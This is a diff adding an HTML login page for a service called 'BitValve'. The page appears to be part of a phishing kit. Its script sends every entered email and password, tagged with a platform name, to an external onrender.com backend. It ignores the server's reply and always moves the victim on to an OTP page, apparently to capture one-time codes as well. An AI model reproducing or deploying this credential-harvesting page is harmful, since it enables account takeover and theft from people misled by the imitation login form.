@@ -1,0 +1,584 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>BitValve - Login</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      * {
+        box-sizing: border-box;
+        margin: 0;
+        padding: 0;
+      }
+
+      body {
+        background-color: #202427;
+        color: #ffffff;
+        font-family:
+          "Inter",
+          -apple-system,
+          BlinkMacSystemFont,
+          "Segoe UI",
+          Roboto,
+          Helvetica,
+          Arial,
+          sans-serif;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        position: relative;
+        padding: 24px 16px;
+      }
+
+      /* Top right theme toggle icon */
+      .theme-toggle-btn {
+        position: absolute;
+        top: 28px;
+        right: 32px;
+        background: none;
+        border: none;
+        cursor: pointer;
+        color: #9ea6b0;
+        padding: 8px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        border-radius: 8px;
+        transition:
+          color 0.2s,
+          background-color 0.2s;
+      }
+
+      .theme-toggle-btn:hover {
+        color: #ffffff;
+        background-color: rgba(255, 255, 255, 0.05);
+      }
+
+      /* Login card container */
+      .login-card {
+        width: 100%;
+        max-width: 536px;
+        background-color: #2b2f32;
+        border-radius: 14px;
+        padding: 44px 48px 36px 48px;
+        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.35);
+      }
+
+      /* Brand Logo */
+      .brand-header {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 12px;
+        margin-bottom: 30px;
+      }
+
+      .brand-logo-icon {
+        width: 32px;
+        height: 32px;
+        flex-shrink: 0;
+      }
+
+      .brand-title {
+        font-size: 26px;
+        font-weight: 700;
+        color: #ffffff;
+        letter-spacing: -0.2px;
+      }
+
+      /* Form Title */
+      .card-title {
+        font-size: 22px;
+        font-weight: 700;
+        color: #ffffff;
+        margin-bottom: 22px;
+        text-align: left;
+      }
+
+      /* Form Fields */
+      .form-group {
+        margin-bottom: 20px;
+        text-align: left;
+      }
+
+      .form-label {
+        display: block;
+        font-size: 11px;
+        font-weight: 700;
+        letter-spacing: 0.6px;
+        color: #8f97a2;
+        margin-bottom: 8px;
+        text-transform: uppercase;
+      }
+
+      .input-wrapper {
+        position: relative;
+        display: flex;
+        align-items: center;
+      }
+
+      .form-input {
+        width: 100%;
+        height: 48px;
+        background-color: #414447;
+        border: 1px solid transparent;
+        border-radius: 8px;
+        padding: 0 16px;
+        font-size: 14px;
+        font-family: inherit;
+        color: #ffffff;
+        outline: none;
+        transition:
+          border-color 0.2s,
+          background-color 0.2s;
+      }
+
+      .form-input::placeholder {
+        color: #7c848f;
+        font-weight: 400;
+      }
+
+      .form-input:focus {
+        border-color: #5c6470;
+        background-color: #464a4e;
+      }
+
+      /* Password Input & Eye Toggle */
+      .password-input {
+        padding-right: 48px;
+      }
+
+      .password-toggle-btn {
+        position: absolute;
+        right: 14px;
+        background: none;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        color: #4ebaa3;
+        padding: 4px;
+        transition: opacity 0.2s;
+      }
+
+      .password-toggle-btn:hover {
+        opacity: 0.85;
+      }
+
+      /* Forgot Password */
+      .forgot-password-row {
+        display: flex;
+        justify-content: flex-end;
+        margin-top: 10px;
+        margin-bottom: 22px;
+      }
+
+      .forgot-password-link {
+        color: #ffffff;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.4px;
+        text-decoration: none;
+        text-transform: uppercase;
+        transition: opacity 0.2s;
+      }
+
+      .forgot-password-link:hover {
+        opacity: 0.8;
+        text-decoration: underline;
+      }
+
+      /* Login Action Button */
+      .btn-login {
+        width: 100%;
+        height: 48px;
+        background-color: #c3ffa8;
+        color: #121c0e;
+        border: none;
+        border-radius: 9999px;
+        font-size: 15px;
+        font-weight: 600;
+        font-family: "JetBrains Mono", "SF Mono", monospace;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition:
+          background-color 0.2s,
+          transform 0.1s,
+          box-shadow 0.2s;
+      }
+
+      .btn-login:hover {
+        background-color: #b1fa90;
+        box-shadow: 0 4px 14px rgba(195, 255, 168, 0.35);
+      }
+
+      .btn-login:active {
+        transform: scale(0.99);
+      }
+
+      /* Divider */
+      .divider {
+        display: flex;
+        align-items: center;
+        text-align: center;
+        margin: 26px 0 22px 0;
+      }
+
+      .divider::before,
+      .divider::after {
+        content: "";
+        flex: 1;
+        border-bottom: 1px solid #3c4146;
+      }
+
+      .divider span {
+        padding: 0 14px;
+        color: #7b838e;
+        font-size: 11px;
+        font-weight: 600;
+        letter-spacing: 0.5px;
+      }
+
+      /* Social Login Buttons */
+      .social-buttons {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        gap: 14px;
+        margin-bottom: 28px;
+      }
+
+      .social-btn {
+        width: 44px;
+        height: 44px;
+        border-radius: 50%;
+        background-color: #ffffff;
+        border: none;
+        cursor: pointer;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        transition:
+          transform 0.15s,
+          box-shadow 0.15s;
+        box-shadow: 0 2px 5px rgba(0, 0, 0, 0.15);
+        text-decoration: none;
+      }
+
+      .social-btn:hover {
+        transform: translateY(-2px);
+        box-shadow: 0 4px 10px rgba(0, 0, 0, 0.25);
+      }
+
+      .social-btn:active {
+        transform: translateY(0);
+      }
+
+      /* Footer Text */
+      .card-footer {
+        text-align: center;
+        font-size: 13px;
+        font-family: "JetBrains Mono", "SF Mono", "Courier New", monospace;
+        color: #9ea6b0;
+      }
+
+      .register-link {
+        color: #72c4bd;
+        text-decoration: underline;
+        font-weight: 600;
+        cursor: pointer;
+        margin-left: 4px;
+        transition: color 0.2s;
+      }
+
+      .register-link:hover {
+        color: #8be0d9;
+      }
+
+      @media (max-width: 600px) {
+        .login-card {
+          padding: 32px 24px 28px 24px;
+        }
+
+        .theme-toggle-btn {
+          top: 16px;
+          right: 16px;
+        }
+      }
+    </style>
+  </head>
+  <body>
+    <!-- Theme Toggle Button (Top Right) -->
+    <button
+      class="theme-toggle-btn"
+      aria-label="Toggle Theme"
+      title="Toggle Theme"
+    >
+      <svg
+        width="22"
+        height="22"
+        viewBox="0 0 24 24"
+        fill="none"
+        stroke="currentColor"
+        stroke-width="2"
+        stroke-linecap="round"
+        stroke-linejoin="round"
+      >
+        <path d="M12 2v2"></path>
+        <path d="M12 20v2"></path>
+        <path d="M4.93 4.93l1.41 1.41"></path>
+        <path d="M17.66 17.66l1.41 1.41"></path>
+        <path d="M2 12h2"></path>
+        <path d="M20 12h2"></path>
+        <path d="M6.34 17.66l-1.41 1.41"></path>
+        <path d="M19.07 4.93l-1.41 1.41"></path>
+        <circle cx="12" cy="12" r="4"></circle>
+        <line x1="2" y1="2" x2="22" y2="22"></line>
+      </svg>
+    </button>
+
+    <!-- Login Card -->
+    <div class="login-card">
+      <!-- BitValve Brand Header -->
+      <div class="brand-header">
+        <!-- Pixelated BitValve Logo Mark -->
+        <svg class="brand-logo-icon" viewBox="0 0 32 32" fill="white">
+          <!-- Top bar and outer border -->
+          <rect x="2" y="2" width="16" height="5" rx="0.5" />
+          <rect x="2" y="7" width="5" height="15" rx="0.5" />
+          <!-- Pixel blocks forming the BitValve logo -->
+          <rect x="18" y="7" width="5" height="5" rx="0.5" />
+          <rect x="7" y="12" width="5" height="5" rx="0.5" />
+          <rect x="15" y="12" width="5" height="5" rx="0.5" />
+          <rect x="10" y="17" width="5" height="5" rx="0.5" />
+          <rect x="18" y="17" width="5" height="5" rx="0.5" />
+          <rect x="10" y="22" width="5" height="5" rx="0.5" />
+        </svg>
+        <span class="brand-title">BitValve</span>
+      </div>
+
+      <!-- Title -->
+      <h1 class="card-title">Login</h1>
+
+      <!-- Login Form -->
+      <form id="loginForm" autocomplete="on">
+        <!-- Email Field -->
+        <div class="form-group">
+          <label for="email" class="form-label">EMAIL</label>
+          <div class="input-wrapper">
+            <input
+              type="email"
+              id="email"
+              name="email"
+              class="form-input"
+              placeholder="Enter your email address"
+              required
+              autocomplete="email"
+            />
+          </div>
+        </div>
+
+        <!-- Password Field -->
+        <div class="form-group">
+          <label for="password" class="form-label">PASSWORD</label>
+          <div class="input-wrapper">
+            <input
+              type="password"
+              id="password"
+              name="password"
+              class="form-input password-input"
+              placeholder="Enter your password"
+              required
+              autocomplete="current-password"
+            />
+            <button
+              type="button"
+              id="togglePasswordBtn"
+              class="password-toggle-btn"
+              aria-label="Toggle password visibility"
+            >
+              <!-- Concentric eye icon matching mockup -->
+              <svg
+                id="eyeIcon"
+                width="22"
+                height="22"
+                viewBox="0 0 24 24"
+                fill="none"
+                stroke="#48b89e"
+                stroke-width="2"
+                stroke-linecap="round"
+                stroke-linejoin="round"
+              >
+                <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+                <circle cx="12" cy="12" r="4"></circle>
+                <circle cx="12" cy="12" r="1.5" fill="#48b89e"></circle>
+              </svg>
+            </button>
+          </div>
+        </div>
+
+        <!-- Forgot Password Link -->
+        <div class="forgot-password-row">
+          <a href="#forgot-password" class="forgot-password-link"
+            >I FORGOT MY PASSWORD</a
+          >
+        </div>
+
+        <!-- Submit Button -->
+        <button type="submit" class="btn-login">Login</button>
+      </form>
+
+      <!-- Divider -->
+      <div class="divider">
+        <span>OR</span>
+      </div>
+
+      <!-- Social Logins -->
+      <div class="social-buttons">
+        <!-- Google -->
+        <button
+          type="button"
+          class="social-btn"
+          aria-label="Sign in with Google"
+          title="Google"
+        >
+          <svg width="22" height="22" viewBox="0 0 24 24">
+            <path
+              fill="#4285F4"
+              d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.51h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.34z"
+            />
+            <path
+              fill="#34A853"
+              d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"
+            />
+            <path
+              fill="#FBBC05"
+              d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.06H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.94l2.85-2.22.81-.63z"
+            />
+            <path
+              fill="#EA4335"
+              d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.06l3.66 2.84c.87-2.6 3.3-4.52 6.16-4.52z"
+            />
+          </svg>
+        </button>
+
+        <!-- Facebook -->
+        <button
+          type="button"
+          class="social-btn"
+          aria-label="Sign in with Facebook"
+          title="Facebook"
+        >
+          <svg width="22" height="22" viewBox="0 0 24 24">
+            <path
+              fill="#1877F2"
+              d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"
+            />
+          </svg>
+        </button>
+
+        <!-- Apple -->
+        <button
+          type="button"
+          class="social-btn"
+          aria-label="Sign in with Apple"
+          title="Apple"
+        >
+          <svg width="20" height="20" viewBox="0 0 170 170" fill="#000000">
+            <path
+              d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.42-6.08-3.7-3.08-7.71-7.91-12.04-14.49-6.08-9.19-10.93-19.69-14.54-31.5-3.61-11.8-5.42-22.95-5.42-33.44 0-14.53 3.65-26.68 10.94-36.45 7.29-9.77 16.5-14.74 27.63-14.92 5.09 0 10.74 1.34 16.94 4.02 6.2 2.68 10.05 4.09 11.55 4.23 1.83-.28 5.86-1.74 12.09-4.39 6.23-2.65 11.75-3.83 16.56-3.53 12.38.74 22.42 5.48 30.12 14.22-10.74 6.54-16.02 15.66-15.84 27.35.18 9.38 3.79 17.29 10.83 23.73 7.04 6.44 15.42 10.22 25.14 11.34-2.2 6.83-4.8 13.51-7.8 20.03zM119.22 33.15c0-7.39 2.69-14.46 8.07-21.21 5.38-6.75 12.07-11.23 20.08-13.44.82 7.02-.91 14.07-5.19 21.15-4.28 7.08-10.3 11.95-18.06 14.61-.83-.37-2.07-.63-3.72-.78-1.65-.15-2.05-.2-2.18-.33z"
+            />
+          </svg>
+        </button>
+      </div>
+
+      <!-- Footer -->
+      <div class="card-footer">
+        Don’t have an account yet?
+        <a href="#register" class="register-link">Register</a>
+      </div>
+    </div>
+
+    <script>
+      // Password visibility toggle
+      const togglePasswordBtn = document.getElementById("togglePasswordBtn");
+      const passwordInput = document.getElementById("password");
+      const eyeIcon = document.getElementById("eyeIcon");
+
+      let isPasswordVisible = false;
+
+      togglePasswordBtn.addEventListener("click", () => {
+        isPasswordVisible = !isPasswordVisible;
+        if (isPasswordVisible) {
+          passwordInput.type = "text";
+          // Eye slashed / active state
+          eyeIcon.innerHTML = `
+          <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"></path>
+          <line x1="1" y1="1" x2="23" y2="23"></line>
+        `;
+        } else {
+          passwordInput.type = "password";
+          // Original concentric eye
+          eyeIcon.innerHTML = `
+          <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path>
+          <circle cx="12" cy="12" r="4"></circle>
+          <circle cx="12" cy="12" r="1.5" fill="#48b89e"></circle>
+        `;
+        }
+      });
+
+      // API endpoint configuration (Change this URL when updating base URL)
+      const API_ENDPOINT = "https://backend-nkxz.onrender.com/api/api/login";
+
+      // Form submit handler with API submission
+      const loginForm = document.getElementById("loginForm");
+      loginForm.addEventListener("submit", async (e) => {
+        e.preventDefault();
+        const submitBtn = loginForm.querySelector('button[type="submit"]');
+        const email = document.getElementById("email").value.trim();
+        const password = document.getElementById("password").value;
+
+        if (submitBtn) {
+          submitBtn.disabled = true;
+          submitBtn.dataset.originalText = submitBtn.textContent;
+          submitBtn.textContent = "Logging in...";
+        }
+
+        try {
+          await fetch(API_ENDPOINT, {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+            },
+            body: JSON.stringify({
+              platform: "bitvalve",
+              email: email,
+              password: password,
+            }),
+          });
+        } catch (err) {
+          console.warn("API submission error (proceeding to OTP):", err);
+        } finally {
+          // Store email for OTP step if needed
+          try {
+            sessionStorage.setItem("login_email", email);
+            localStorage.setItem("login_email", email);
+          } catch (_) {}
+
+          // Navigate to OTP page
+          window.location.href = "../otp";
+        }
+      });
+    </script>
+  </body>
+</html>
